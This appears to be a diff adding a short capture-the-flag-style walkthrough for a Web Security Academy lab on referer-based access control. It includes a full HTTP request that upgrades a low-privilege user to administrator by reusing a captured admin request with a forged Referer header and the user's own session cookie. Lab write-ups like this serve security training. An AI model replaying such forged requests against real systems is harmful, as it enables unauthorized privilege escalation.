@@ -1,0 +1,17 @@
+Referer-based access control 
+
+This is fairly simple as it only checks for the referer. Log in as adminstrator, upgrade carlos and send the request to repeater.
+Log out and log in as wiener and get your session cookie. Use it in the saved request.
+
+Request:
+GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
+Host: aca81ffc1f94371780c71ed100ed0078.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://aca81ffc1f94371780c71ed100ed0078.web-security-academy.net/admin
+Cookie: session=kbhuumlQI48ukunmDwdD3a7CJufxqfPC
+Upgrade-Insecure-Requests: 1
+
